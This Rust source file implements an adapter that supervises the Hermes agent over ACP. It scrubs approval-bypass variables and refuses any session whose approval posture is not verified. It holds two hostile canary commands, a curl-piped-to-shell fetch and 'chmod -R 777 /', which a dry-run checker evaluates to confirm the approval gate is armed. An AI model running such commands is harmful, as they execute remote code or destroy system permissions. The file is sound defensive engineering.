//! Native Hermes adapter: drive the `hermes` CLI through **ACP** (Agent
//! Client Protocol) over stdio, in its own process group, with sanitized
//! env and piped stdio.
//!
//! # Why ACP and not a CLI scrape
//!
//! Hermes offers four plausible surfaces and only one of them is a real
//! client protocol (all four checked live against
//! `Hermes Agent v0.20.4 (2026.8.18)`, 2026-08-20):
//!
//! - `-z/--oneshot` — its own `--help` says "approvals are auto-bypassed".
//!   Disqualified on the first line of its documentation; eave will not
//!   drive a surface that cannot ask.
//! - `--cli` / `--tui` — human REPLs. No machine-readable frame format.
//! - `serve` — a long-lived HTTP/WebSocket backend on a port, shared
//!   machine-wide. Wrong lifetime and wrong ownership for one session in
//!   one process group.
//! - `acp` — newline-delimited JSON-RPC 2.0 on stdio, protocol version 1,
//!   with streaming `session/update` notifications, multi-turn on one
//!   process, and **permission questions as first-class agent→client
//!   requests**. That last property is the whole reason this adapter
//!   exists: it is the Hermes analogue of Slice K's
//!   `--permission-prompt-tool stdio`, except standardised rather than
//!   undocumented.
//!
//! So: one `hermes acp` process per session, `initialize` → `session/new`
//! (or `session/load` on resume) → one `session/prompt` per turn.
//!
//! # Permission posture (the part that took the work)
//!
//! Hermes has **three independent approval bypasses**, and its own
//! `approvals test` evaluator was used to prove each one rather than to
//! guess at it (transcripts in the Slice AW report):
//!
//! 1. `HERMES_YOLO_MODE` in the environment, frozen at import time
//!    (`tools/approval.py:37`). **Scrubbed from the child env** below,
//!    along with `HERMES_ACCEPT_HOOKS` — a hook is arbitrary shell that
//!    would otherwise run without consent.
//! 2. `approvals.mode: off` in `~/.hermes/config.yaml`.
//! 3. `command_allowlist` entries in the same file.
//!
//! `--ignore-user-config` does **not** close 2 or 3. That was checked, not
//! assumed: `HERMES_IGNORE_USER_CONFIG=1` is read by `cli.py`'s
//! `load_cli_config()`, but the approval gate reads
//! `hermes_cli/config.py`'s `load_config_readonly()`, which has no such
//! branch — and `hermes approvals test` returns `allow ("approval bypass
//! active")` with the variable set. So this adapter does **not** set it:
//! it would disable the operator's provider and model configuration
//! (breaking the session outright) while delivering none of the safety
//! that would justify doing so. See [`preflight`].
//!
//! Instead the posture is **verified twice, from two independent facts**,
//! in the spirit of Slice K's `init.permissionMode` — never assumed:
//!
//! - **Edits.** `session/new` answers with `modes.currentModeId`. `default`
//!   is Hermes' own "Ask before edits"; `accept_edits` and `dont_ask`
//!   auto-allow file writes. Anything but `default` is refused at the
//!   first frame, exactly like a Claude session reporting `acceptEdits`.
//! - **Commands.** `hermes approvals test` is a dry-run of the real
//!   runtime guards that "never executes the command, prompts anyone, or
//!   persists anything" (its own `--help`). Two known-dangerous canaries
//!   are put through it in the same env and cwd the session will run in,
//!   and both must come back `ask-approval`. That is the only thing that
//!   sees bypasses 1–3, because they live in the operator's config and
//!   environment rather than on the wire.
//!
//! # What this posture does NOT guarantee — read this before trusting it
//!
//! Under Claude, `--permission-prompt-tool stdio` routes **every** tool to
//! eave. Hermes is narrower, and no flag widens it:
//!
//! - Only **dangerous-pattern** shell commands ask. `ls -la` returns
//!   `allow ("no guard matched; would run without a prompt")` and eave
//!   never sees it.
//! - Only `write_file` and `patch` go through the edit-approval bridge.
//!   Other tools (`web_search`, MCP tools, …) do not ask.
//! - Hermes **stops waiting after 60 seconds** and auto-denies
//!   (`acp_adapter/permissions.py:114`). eave's rule is that a session
//!   waits indefinitely on a human; Hermes' is not. The failure direction
//!   is deny, so nothing is written unreviewed — but the question expires,
//!   and a card left on screen past that point would be a lie. See
//!   [`APPROVAL_STALE_AFTER`].
//! - An ACP permission response carries no free text
//!   (`RequestPermissionResponse.outcome` is `{outcome, optionId}` only),
//!   so an operator's **deny message is not delivered to the model**. The
//!   decision lands; the reason does not.

use std::collections::{HashMap, HashSet, VecDeque};
use std::os::unix::process::ExitStatusExt;
use std::process::Stdio;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use async_trait::async_trait;
use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::{ChildStdin, Command};
use tokio::sync::{mpsc, watch};

use crate::events::{cap_payload, SessionEvent};
use crate::media::{self, EncodedImage, ImageRef};
use crate::proc::{self, ProcIdentity};
use crate::process;
use crate::session::{
    AgentSession, ApprovalDecision, KillReport, SessionError, SessionWatch, SpawnConfig,
};
use crate::thresholds::{KILL_GRACE, KILL_VERIFY_WINDOW};

const STDERR_RING_CAP: usize = 4096;
const EVENT_CHANNEL_CAP: usize = 256;
const MALFORMED_LINE_CAP: usize = 512;

/// JSON-RPC id of the `initialize` request. Fixed rather than allocated so
/// the reader's state machine can recognise the reply without a table.
const ID_INITIALIZE: u64 = 1;
/// JSON-RPC id of the `session/new` (or `session/load`) request.
const ID_SESSION_SETUP: u64 = 2;
/// First id handed to a `session/prompt`. Everything at or above this is a
/// turn, which is what makes the reply recognisable as a turn result.
const ID_FIRST_PROMPT: u64 = 3;

/// ACP protocol version this adapter speaks. `1` is what the installed
/// Hermes answers `initialize` with (`acp/meta.py:29`, and the live
/// handshake capture in the Slice AW report).
const ACP_PROTOCOL_VERSION: u64 = 1;

/// The only session mode whose description is "Ask before edits"
/// (`acp_adapter/server.py:_session_modes`, and the live `session/new`
/// reply). Fail-closed like Slice K's `ASKING_MODES`: an unrecognised mode
/// — including one this build has never heard of — is refused, because
/// "does this posture review writes?" has no safe default.
const ASKING_MODES: [&str; 1] = ["default"];

/// How long Hermes waits for a permission answer before it stops waiting
/// and auto-denies.
///
/// **Cited, not chosen**: `timeout: float = 60.0` in
/// `acp_adapter/permissions.py:114` and `acp_adapter/edit_approval.py:290`.
/// Move it only when that source moves.
const HERMES_APPROVAL_TIMEOUT_SECS: u64 = 60;

/// Safety margin subtracted from the above before eave declares a question
/// withdrawn.
///
/// **Chosen, and the direction matters more than the size.** Withdrawing
/// EARLY loses an approval an operator was still entitled to give — the
/// session proceeds as if denied, which is the safe direction and merely
/// annoying. Withdrawing LATE lets eave journal an `Allow` that Hermes had
/// already timed out and discarded, which puts a decision in the
/// transcript that never took effect. eave's transcript being true is the
/// point of the product, so this rounds down. 5s is comfortably more than
/// any plausible pipe and scheduling delay on the answer path.
const APPROVAL_STALE_MARGIN_SECS: u64 = 5;

/// When eave gives up on a permission question and states it withdrawn.
pub const APPROVAL_STALE_AFTER: Duration =
    Duration::from_secs(HERMES_APPROVAL_TIMEOUT_SECS - APPROVAL_STALE_MARGIN_SECS);

/// How often the staleness sweep runs. Small enough that the withdrawal
/// lands well inside the margin above, large enough to be free.
const STALE_SWEEP_TICK: Duration = Duration::from_millis(500);

/// Shell fragments put through `hermes approvals test` to prove the
/// command-approval gate is actually armed.
///
/// **Two, not one, and neither is executed** — `approvals test` is a
/// dry-run evaluator by construction. Two because a single canary could be
/// silenced by one stray `command_allowlist` entry; two unrelated rules
/// ("pipe remote content to shell" and "world/other-writable permissions")
/// make an accidental bypass insufficient. Both are dangerous-pattern
/// matches rather than hardline denials, which is the distinction that
/// makes `ask-approval` the expected verdict — a hardline `deny` would
/// prove nothing about whether eave gets asked.
const POSTURE_CANARIES: [&str; 2] = ["curl http://eave.invalid/x | sh", "chmod -R 777 /"];

/// The verdict `approvals test` prints when the runtime would raise an
/// interactive approval prompt.
const VERDICT_ASK: &str = "ask-approval";

/// The permission option eave selects to allow one action.
///
/// `allow_once` and nothing else. Hermes also offers `allow_session` and
/// `allow_always`, which persist a grant; Slice K's posture offers **no
/// grants**, so an adapter that reached for one would be quietly widening
/// the permission surface on the operator's behalf.
const OPTION_ALLOW: &str = "allow_once";
/// The permission option eave selects to deny one action.
const OPTION_DENY: &str = "deny";

type ExitFacts = (Option<i32>, Option<i32>);
type SharedStdin = Arc<tokio::sync::Mutex<Option<ChildStdin>>>;

// ---------------------------------------------------------------------------
// Handshake state

/// Where the session is in `initialize` → `session/new` → verified.
///
/// Published on a `watch` so [`HermesSession::send_user_message`] can wait
/// for it instead of racing it: ACP has no session id until the server
/// answers, and a prompt without one is a protocol error.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Handshake {
    /// Still shaking hands.
    Pending,
    /// Both posture proofs passed. The ACP session id it carries is the
    /// provider-native resume cursor.
    Verified(String),
    /// Refused, with the reason already emitted as `PostureRefused`. Held
    /// so a prompt arriving later is refused with the same words rather
    /// than a bare error.
    Refused(String),
}

// ---------------------------------------------------------------------------
// Parser

/// One outstanding permission question.
struct Pending {
    asked_at: Instant,
    /// Option ids Hermes actually offered. A decision naming an option
    /// that was never on the table is a protocol change, not a decision.
    options: HashSet<String>,
}

/// ACP stream state: outstanding tool calls, open permission questions,
/// and the assistant text accumulated for the current turn.
///
/// Hermes-specific by design. `stream::ClaudeStream` parses Claude's
/// stream-JSON and shares nothing with JSON-RPC beyond the word "line".
#[derive(Default)]
struct AcpStream {
    /// ACP `toolCallId`s started and not yet seen in a terminal state.
    outstanding: Vec<String>,
    pending: HashMap<String, Pending>,
    session_id: Option<String>,
    /// Assistant text deltas for the turn in progress, flushed as one
    /// `AssistantText` when the turn's `session/prompt` reply lands.
    turn_text: String,
}

impl AcpStream {
    fn in_flight(&self) -> usize {
        self.outstanding.len()
    }

    fn pending_approvals(&self) -> usize {
        self.pending.len()
    }

    fn resolve_approval(&mut self, request_id: &str) -> bool {
        self.pending.remove(request_id).is_some()
    }

    /// Question ids Hermes has been waiting on for longer than it waits.
    fn stale_approvals(&self, older_than: Duration) -> Vec<String> {
        let now = Instant::now();
        self.pending
            .iter()
            .filter(|(_, p)| now.duration_since(p.asked_at) >= older_than)
            .map(|(id, _)| id.clone())
            .collect()
    }
}

fn malformed(line: &str, error: String) -> SessionEvent {
    SessionEvent::Malformed {
        line: line.chars().take(MALFORMED_LINE_CAP).collect(),
        error,
    }
}

/// Compact JSON for the journal, bounded by the shared payload cap.
fn payload(v: &Value) -> String {
    cap_payload(&v.to_string())
}

/// Flatten ACP `ToolCallContent` blocks to text, so a tool result reads as
/// a result rather than as protocol.
fn flatten_tool_content(content: Option<&Value>) -> String {
    let Some(Value::Array(blocks)) = content else {
        return String::new();
    };
    let mut out = String::new();
    for block in blocks {
        let piece = match block.get("type").and_then(Value::as_str) {
            Some("content") => block
                .get("content")
                .and_then(|c| c.get("text"))
                .and_then(Value::as_str)
                .map(str::to_string),
            // A diff's own bytes are the result: what the file became.
            Some("diff") => block
                .get("newText")
                .and_then(Value::as_str)
                .map(str::to_string),
            // Anything else (terminal refs, future block types) is kept
            // verbatim rather than dropped — the journal is the record.
            _ => Some(block.to_string()),
        };
        if let Some(piece) = piece {
            if !out.is_empty() {
                out.push('\n');
            }
            out.push_str(&piece);
        }
    }
    out
}

/// The concrete path an approval would touch, when the request names one.
///
/// Checked in the order Hermes actually populates: an edit approval puts
/// it on the diff block, a command approval never has one, and
/// `locations` is the generic fallback.
fn approval_path(tool_call: &Value) -> Option<String> {
    if let Some(Value::Array(blocks)) = tool_call.get("content") {
        for block in blocks {
            if block.get("type").and_then(Value::as_str) == Some("diff") {
                if let Some(p) = block.get("path").and_then(Value::as_str) {
                    return Some(p.to_string());
                }
            }
        }
    }
    tool_call
        .get("locations")
        .and_then(Value::as_array)
        .and_then(|l| l.first())
        .and_then(|l| l.get("path"))
        .and_then(Value::as_str)
        .map(str::to_string)
}

impl AcpStream {
    /// A `session/update` notification's payload.
    fn parse_session_update(&mut self, params: &Value, line: &str) -> Vec<SessionEvent> {
        let update = &params["update"];
        let kind = update
            .get("sessionUpdate")
            .and_then(Value::as_str)
            .unwrap_or("");
        match kind {
            "agent_message_chunk" => {
                let text = update
                    .get("content")
                    .and_then(|c| c.get("text"))
                    .and_then(Value::as_str)
                    .unwrap_or("");
                if text.is_empty() {
                    return Vec::new();
                }
                self.turn_text.push_str(text);
                vec![SessionEvent::TextDelta {
                    text: text.to_string(),
                }]
            }
            "user_message_chunk" => {
                let text = update
                    .get("content")
                    .and_then(|c| c.get("text"))
                    .and_then(Value::as_str)
                    .unwrap_or("");
                vec![SessionEvent::UserEcho {
                    text: text.to_string(),
                }]
            }
            "tool_call" => {
                let Some(id) = update.get("toolCallId").and_then(Value::as_str) else {
                    return vec![malformed(line, "tool_call without toolCallId".into())];
                };
                if !self.outstanding.iter().any(|o| o == id) {
                    self.outstanding.push(id.to_string());
                }
                vec![SessionEvent::ToolUseStarted {
                    id: id.to_string(),
                    // `name` is ACP's `kind`, NOT the Hermes tool name.
                    //
                    // The tool name is not on the wire at all: for the
                    // tools that matter (`terminal`, `write_file`,
                    // `patch`, `read_file`) `acp_adapter/tools.py` passes
                    // no `rawInput` and folds the name into a human
                    // `title` like `"terminal: cargo test"`. Splitting
                    // that title on `": "` would recover the name most of
                    // the time and silently invent one the rest of the
                    // time. `kind` is an enumerated protocol value that is
                    // always present and never a guess; the title is
                    // preserved verbatim in `input` below, where the rail
                    // can show it.
                    name: update
                        .get("kind")
                        .and_then(Value::as_str)
                        .unwrap_or("other")
                        .to_string(),
                    input: payload(update),
                }]
            }
            "tool_call_update" => {
                let Some(id) = update.get("toolCallId").and_then(Value::as_str) else {
                    return vec![malformed(
                        line,
                        "tool_call_update without toolCallId".into(),
                    )];
                };
                let status = update.get("status").and_then(Value::as_str).unwrap_or("");
                if !matches!(status, "completed" | "failed") {
                    // `pending`/`in_progress` are progress, not a resolve.
                    return vec![SessionEvent::System {
                        subtype: format!("tool_call_progress:{status}"),
                        raw: line.to_string(),
                    }];
                }
                self.outstanding.retain(|o| o != id);
                vec![SessionEvent::ToolUseFinished {
                    id: id.to_string(),
                    result: cap_payload(&flatten_tool_content(update.get("content"))),
                    // Hermes' own verdict, not an inference from the text.
                    is_error: status == "failed",
                }]
            }
            // The posture can change under eave's feet: ACP lets a client
            // switch modes and the agent announce it. eave never sends
            // `session/set_mode`, so this should never fire — and if it
            // does, the session is running in a posture nobody verified.
            "current_mode_update" => {
                let mode = update
                    .get("currentModeId")
                    .and_then(Value::as_str)
                    .unwrap_or("");
                match mode_refusal(Some(mode)) {
                    Some(refusal) => vec![refusal],
                    None => vec![SessionEvent::System {
                        subtype: "current_mode_update".into(),
                        raw: line.to_string(),
                    }],
                }
            }
            // Thoughts, plans, command lists and anything Hermes adds
            // later: recorded verbatim so the journal keeps them without a
            // parser change (same rationale as `SessionEvent::System`).
            other => vec![SessionEvent::System {
                subtype: other.to_string(),
                raw: line.to_string(),
            }],
        }
    }

    /// An agent→client `session/request_permission`. This is the whole
    /// reason the adapter speaks ACP.
    fn parse_permission_request(&mut self, id: &str, params: &Value) -> Vec<SessionEvent> {
        let tool_call = params.get("toolCall").cloned().unwrap_or(Value::Null);
        let options = params.get("options").cloned().unwrap_or(Value::Null);
        let offered: HashSet<String> = options
            .as_array()
            .map(|opts| {
                opts.iter()
                    .filter_map(|o| o.get("optionId").and_then(Value::as_str))
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();

        // The command approval carries `{command, description}` as
        // rawInput; the edit approval carries `{tool, arguments}`. Take
        // the description when it is there and the flattened content when
        // it is not — never invent one.
        let description = tool_call
            .get("rawInput")
            .and_then(|r| r.get("description"))
            .and_then(Value::as_str)
            .map(str::to_string)
            .unwrap_or_else(|| flatten_tool_content(tool_call.get("content")));

        // Full input, verbatim: approving without knowing what you
        // approved is the failure this exists to prevent. `rawInput` when
        // Hermes sends one, the whole tool call when it does not — an edit
        // approval's diff lives in `content`, and dropping it would leave
        // the operator approving a path with no idea what goes in it.
        let input_json = match tool_call.get("rawInput") {
            Some(raw) if !raw.is_null() => payload(raw),
            _ => payload(&tool_call),
        };

        self.pending.insert(
            id.to_string(),
            Pending {
                asked_at: Instant::now(),
                options: offered,
            },
        );

        vec![SessionEvent::ApprovalRequested {
            request_id: id.to_string(),
            tool: tool_call
                .get("kind")
                .and_then(Value::as_str)
                .unwrap_or("other")
                .to_string(),
            display_name: tool_call
                .get("title")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string(),
            description,
            path: approval_path(&tool_call),
            input_json,
            // Hermes' own offer of how to stop being asked
            // (`allow_session`, `allow_always`, `deny_always`). eave takes
            // none of them; it is journaled because it is a fact about the
            // request, exactly as Slice K journals Claude's suggestions.
            suggestions_json: options.as_array().map(|_| payload(&options)),
        }]
    }
}

/// Refuse any mode that is not provably an asking one.
fn mode_refusal(mode: Option<&str>) -> Option<SessionEvent> {
    match mode {
        Some(m) if ASKING_MODES.contains(&m) => None,
        Some(m) => Some(SessionEvent::PostureRefused {
            mode: m.to_string(),
            reason: format!(
                "Hermes is running in ACP session mode {m:?}, which auto-allows file edits \
                 instead of asking; eave refuses to supervise a session it cannot review"
            ),
        }),
        None => Some(SessionEvent::PostureRefused {
            mode: "unstated".into(),
            reason: "Hermes did not state an ACP session mode, so eave cannot prove it will \
                     ask before it writes"
                .into(),
        }),
    }
}

// ---------------------------------------------------------------------------
// Preflight: the command-approval half of the posture proof

/// Result of asking Hermes' own evaluator whether it would still ask.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Preflight {
    /// Every canary came back `ask-approval`.
    Asks,
    /// It would not ask, and this is why.
    Refused(String),
}

/// Read one Hermes config key, or `None` when it is unset.
///
/// `hermes config get --json <key>` prints JSON when the key is set and a
/// plain English "Config key not set: …" line when it is not — **both with
/// exit status 0**. So the discriminator is "did stdout parse as JSON",
/// not a match on the English, which would break the day the wording
/// changes.
async fn config_get(
    program: &std::path::Path,
    cwd: &std::path::Path,
    env: &ChildEnv,
    key: &str,
) -> Option<String> {
    let mut cmd = Command::new(program);
    cmd.current_dir(cwd)
        .args(["config", "get", "--json", key])
        .stdin(Stdio::null());
    env.apply(&mut cmd);
    let out = cmd.output().await.ok()?;
    let text = String::from_utf8_lossy(&out.stdout);
    match serde_json::from_str::<Value>(text.trim()) {
        Ok(Value::String(s)) => Some(s),
        _ => None,
    }
}

/// Prove that Hermes' command-approval gate is armed for the environment
/// this session is about to run in.
///
/// This is the only check that can see the operator's `config.yaml` and
/// environment, which is where all three approval bypasses live. It runs
/// `hermes approvals test`, which by its own `--help` evaluates "against
/// the REAL runtime approval guards … without executing the command,
/// prompting anyone, or persisting anything".
///
/// `env_type` matters and is not assumed: an isolated container backend
/// makes the runtime "skip all command guards", so the probe is run
/// against the backend the session will actually use, and a backend that
/// skips the guards produces `allow` and is refused here.
pub async fn preflight(
    program: &std::path::Path,
    cwd: &std::path::Path,
    env: &ChildEnv,
) -> Preflight {
    // Hermes is a Python program that loads its plugin set on every
    // invocation: one `hermes` subprocess measured 2.4–4.9s wall on the
    // development machine (2026-08-20, three samples each of `config get`
    // and `approvals test`). Three of them in series would add ~10s to
    // every session spawn, so the canaries run concurrently and the whole
    // preflight is started in parallel with the ACP handshake — which is
    // itself waiting on the same interpreter boot.
    let env_type = config_get(program, cwd, env, "terminal.env_type")
        .await
        .unwrap_or_else(|| "local".to_string());

    let mut probes = Vec::with_capacity(POSTURE_CANARIES.len());
    for canary in POSTURE_CANARIES {
        probes.push(tokio::spawn(probe_canary(
            program.to_path_buf(),
            cwd.to_path_buf(),
            env.clone(),
            env_type.clone(),
            canary,
        )));
    }
    // Awaited in order, so the reported refusal is the same one every
    // time regardless of which subprocess happened to finish first.
    let mut refusal = None;
    for probe in probes {
        let verdict = match probe.await {
            Ok(verdict) => verdict,
            Err(err) => Preflight::Refused(format!(
                "eave could not complete the Hermes approval probe ({err}); a posture that \
                 cannot be checked is not a posture eave will run under"
            )),
        };
        if refusal.is_none() {
            if let Preflight::Refused(_) = verdict {
                refusal = Some(verdict);
            }
        }
    }
    refusal.unwrap_or(Preflight::Asks)
}

/// Put one canary through `hermes approvals test` and read the verdict.
async fn probe_canary(
    program: std::path::PathBuf,
    cwd: std::path::PathBuf,
    env: ChildEnv,
    env_type: String,
    canary: &'static str,
) -> Preflight {
    let mut cmd = Command::new(&program);
    cmd.current_dir(&cwd)
        .args(["approvals", "test", "--json", "--env-type", &env_type, "--"])
        .arg(canary)
        .stdin(Stdio::null());
    env.apply(&mut cmd);
    let out = match cmd.output().await {
        Ok(out) => out,
        Err(err) => {
            return Preflight::Refused(format!(
                "eave could not run `hermes approvals test` to prove Hermes would ask \
                 before running a dangerous command ({err}); a posture that cannot be \
                 checked is not a posture eave will run under"
            ));
        }
    };
    let text = String::from_utf8_lossy(&out.stdout);
    let verdict = serde_json::from_str::<Value>(text.trim())
        .ok()
        .and_then(|v| v.get("verdict").and_then(Value::as_str).map(str::to_string));
    match verdict.as_deref() {
        Some(VERDICT_ASK) => Preflight::Asks,
        Some(other) => Preflight::Refused(format!(
            "Hermes answers {other:?} for {canary:?} under terminal backend {env_type:?} — \
             it would run that without asking eave. A bypass is active (approvals.mode: \
             off, a command_allowlist entry, or an isolating terminal backend); eave will \
             not supervise a session it cannot review"
        )),
        None => Preflight::Refused(format!(
            "`hermes approvals test` gave no verdict for {canary:?}, so eave cannot prove \
             Hermes would ask before running a dangerous command"
        )),
    }
}

// ---------------------------------------------------------------------------
// Session

struct Shared {
    stream: Mutex<AcpStream>,
    last_activity: Mutex<Instant>,
    /// Set at kill initiation; the reader drops all protocol input from
    /// then on — descendants holding inherited pipes may emit stale lines
    /// after the leader dies (spec 01 §Kill).
    kill_initiated: AtomicBool,
    ready: watch::Sender<Handshake>,
}

pub struct HermesSession {
    identity: ProcIdentity,
    pgid: i32,
    /// Shared because three writers exist: the engine sending a prompt,
    /// the engine answering an approval, and the reader task driving the
    /// handshake and refusing requests eave cannot serve. Serialized by
    /// the mutex — a frame can never interleave with another mid-line.
    stdin: SharedStdin,
    shared: Arc<Shared>,
    ready_rx: watch::Receiver<Handshake>,
    next_id: AtomicU64,
    exit_rx: watch::Receiver<Option<ExitFacts>>,
    stdout_eof: Arc<AtomicBool>,
    exited_flag: Arc<AtomicBool>,
}

impl HermesSession {
    /// Spawn one `hermes acp` process in its own process group with
    /// sanitized env and piped stdio (spec 01 §Spawn). Returns the session
    /// handle and its event stream; `SessionEvent::Exited` is always the
    /// final event.
    pub fn spawn(cfg: &SpawnConfig) -> Result<(Self, mpsc::Receiver<SessionEvent>), SessionError> {
        let mut cmd = Command::new(&cfg.program);
        cmd.current_dir(&cfg.cwd)
            .arg("acp")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(false);
        // The session's own flags, after eave's, verbatim and last. Already
        // filtered of anything that would undo the posture at the engine
        // boundary (`session::conflicts_with_eave_flags`) — this is a
        // spawn, not a policy point.
        //
        // NOTE the asymmetry with `claude.rs`: there is no `--model` here.
        // `hermes acp` takes no model flag; ACP carries the model as
        // protocol (`session/new` answers with `models.availableModels`
        // and `session/set_model` switches it), so a `--model` on this
        // argv would be silently ignored — worse than absent. Model
        // selection is stated as Not Done in the Slice AW report rather
        // than faked here.
        for arg in &cfg.extra_args {
            cmd.arg(arg);
        }

        let child_env = ChildEnv::for_session(&cfg.extra_env);
        child_env.apply(&mut cmd);
        unsafe {
            cmd.pre_exec(|| {
                if libc::setsid() == -1 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }

        let mut child = cmd.spawn().map_err(SessionError::Spawn)?;
        let pid = child.id().expect("freshly spawned child has a pid") as i32;
        let identity = match proc::identity_of(pid) {
            Some(id) => id,
            // Same reasoning as `claude.rs`: a fast child can exit before
            // we fingerprint it, and a zombie is not inspectable. Confirm
            // the exit and record a sentinel identity that can never match.
            None => match child.try_wait() {
                Ok(Some(_)) => ProcIdentity {
                    pid,
                    start_tvsec: 0,
                    start_tvusec: 0,
                },
                _ => return Err(SessionError::IdentityUnavailable { pid }),
            },
        };

        let stdin: SharedStdin = Arc::new(tokio::sync::Mutex::new(child.stdin.take()));
        let stdout = child.stdout.take().expect("stdout piped");
        let stderr = child.stderr.take().expect("stderr piped");

        let (ready_tx, ready_rx) = watch::channel(Handshake::Pending);
        let shared = Arc::new(Shared {
            stream: Mutex::new(AcpStream::default()),
            last_activity: Mutex::new(Instant::now()),
            kill_initiated: AtomicBool::new(false),
            ready: ready_tx,
        });
        let (events_tx, events_rx) = mpsc::channel(EVENT_CHANNEL_CAP);
        let (exit_tx, exit_rx) = watch::channel(None);

        let stdout_eof = Arc::new(AtomicBool::new(false));
        let exited_flag = Arc::new(AtomicBool::new(false));

        // Started HERE rather than when the handshake needs it. Both this
        // and Hermes' own ACP boot are waiting on the same slow Python
        // interpreter start, so running them in parallel hides most of the
        // preflight's cost instead of adding it to every session spawn.
        // Nothing acts on the answer until the posture is checked, so
        // starting early cannot let an unverified session do anything.
        let preflight_task = tokio::spawn({
            let program = cfg.program.clone();
            let cwd = cfg.cwd.clone();
            let env = child_env.clone();
            async move { preflight(&program, &cwd, &env).await }
        });

        let reader = Reader {
            shared: Arc::clone(&shared),
            tx: events_tx.clone(),
            stdin: Arc::clone(&stdin),
            cwd: cfg.cwd.clone(),
            preflight: tokio::sync::Mutex::new(Some(preflight_task)),
            resume: cfg.resume.then(|| cfg.session_id.clone()),
        };
        let reader_eof = Arc::clone(&stdout_eof);
        let stdout_task = tokio::spawn(async move {
            reader.run(stdout).await;
            // EOF (or read error): with the process still alive this is
            // provable stream death — the attention monitor's `failed`
            // input (spec 01).
            reader_eof.store(true, Ordering::SeqCst);
        });

        // The staleness sweep. Hermes stops waiting for a permission
        // answer long before a human necessarily does, and it does not
        // tell us when it gives up — so eave notices on its own rather
        // than leaving an unanswerable card on screen.
        let sweep_shared = Arc::clone(&shared);
        let sweep_tx = events_tx.clone();
        let sweep_task = tokio::spawn(async move {
            loop {
                tokio::time::sleep(STALE_SWEEP_TICK).await;
                if sweep_tx.is_closed() {
                    return;
                }
                let stale = {
                    let mut stream = sweep_shared.stream.lock().unwrap();
                    let stale = stream.stale_approvals(APPROVAL_STALE_AFTER);
                    for id in &stale {
                        stream.resolve_approval(id);
                    }
                    stale
                };
                for id in stale {
                    let _ = sweep_tx
                        .send(SessionEvent::ApprovalWithdrawn {
                            request_id: id,
                            reason: format!(
                                "Hermes stops waiting for an answer after {}s and denies on \
                                 its own; eave can no longer deliver a decision for this \
                                 question",
                                HERMES_APPROVAL_TIMEOUT_SECS
                            ),
                        })
                        .await;
                }
            }
        });

        let ring: Arc<Mutex<VecDeque<u8>>> = Arc::new(Mutex::new(VecDeque::new()));
        let ring_writer = Arc::clone(&ring);
        let stderr_task = tokio::spawn(async move {
            let mut stderr = stderr;
            let mut buf = [0u8; 1024];
            while let Ok(n) = stderr.read(&mut buf).await {
                if n == 0 {
                    break;
                }
                let mut ring = ring_writer.lock().unwrap();
                ring.extend(&buf[..n]);
                while ring.len() > STDERR_RING_CAP {
                    ring.pop_front();
                }
            }
        });

        // Supervisor: reap the leader, stop the sweep, drain both readers,
        // then emit the terminal Exited event and publish the exit facts.
        let super_exited = Arc::clone(&exited_flag);
        tokio::spawn(async move {
            let status = child.wait().await;
            super_exited.store(true, Ordering::SeqCst);
            sweep_task.abort();
            let _ = stdout_task.await;
            let _ = stderr_task.await;
            let facts: ExitFacts = match &status {
                Ok(s) => (s.code(), s.signal()),
                Err(_) => (None, None),
            };
            let stderr_tail = {
                let mut ring = ring.lock().unwrap();
                String::from_utf8_lossy(ring.make_contiguous()).into_owned()
            };
            let _ = events_tx
                .send(SessionEvent::Exited {
                    code: facts.0,
                    signal: facts.1,
                    stderr_tail,
                })
                .await;
            let _ = exit_tx.send(Some(facts));
        });

        Ok((
            Self {
                identity,
                pgid: pid,
                stdin,
                shared,
                ready_rx,
                next_id: AtomicU64::new(ID_FIRST_PROMPT),
                exit_rx,
                stdout_eof,
                exited_flag,
            },
            events_rx,
        ))
    }

    async fn await_exit(&self, window: Duration) -> bool {
        let mut rx = self.exit_rx.clone();
        let waited = tokio::time::timeout(window, async {
            loop {
                if rx.borrow_and_update().is_some() {
                    return true;
                }
                if rx.changed().await.is_err() {
                    return false;
                }
            }
        })
        .await;
        matches!(waited, Ok(true))
    }

    fn exited(&self) -> bool {
        self.exit_rx.borrow().is_some()
    }

    /// The verified ACP session id, once the handshake has produced one.
    ///
    /// Waits rather than races: a caller that sends a prompt the
    /// millisecond after spawn is normal, and ACP has no session id until
    /// the server answers `session/new`. A refused posture resolves here
    /// too, so a prompt after a refusal is refused **with the reason**
    /// rather than with a bare protocol error — and, critically, is never
    /// sent. The engine already kills a session on `PostureRefused`; this
    /// is the second lock on the same door, so that a refused session
    /// cannot write even if it somehow keeps running.
    async fn acp_session_id(&self) -> Result<String, SessionError> {
        let mut rx = self.ready_rx.clone();
        loop {
            match rx.borrow_and_update().clone() {
                Handshake::Verified(id) => return Ok(id),
                Handshake::Refused(reason) => {
                    return Err(SessionError::Io(std::io::Error::new(
                        std::io::ErrorKind::PermissionDenied,
                        reason,
                    )))
                }
                Handshake::Pending => {}
            }
            if rx.changed().await.is_err() {
                // The sender lives in `Shared`, which outlives the reader,
                // so this only happens once the session itself is gone.
                return Err(SessionError::StdinClosed);
            }
        }
    }
}

/// Environment variables removed from every Hermes child, because each one
/// is an approval bypass the operator's shell could be carrying.
///
/// `HERMES_YOLO_MODE` is frozen at Hermes' import time and turns every
/// dangerous-command prompt into an auto-approve (verified: `hermes
/// approvals test` returns `allow ("approval bypass active")` with it set).
/// `HERMES_ACCEPT_HOOKS` auto-approves unseen shell hooks declared in the
/// operator's config — arbitrary shell, run with no consent prompt.
const SCRUBBED_HERMES_VARS: [&str; 2] = ["HERMES_YOLO_MODE", "HERMES_ACCEPT_HOOKS"];

/// Exactly what eave does to the inherited environment before running any
/// Hermes process.
///
/// **One value, applied identically to the session and to the preflight
/// probe, and that identity is the point.** A probe that runs in a
/// different environment than the session vouches for a posture nobody is
/// going to run under: `HERMES_HOME` alone would point the two at
/// different `config.yaml` files, and the probe would answer honestly
/// about the wrong machine.
///
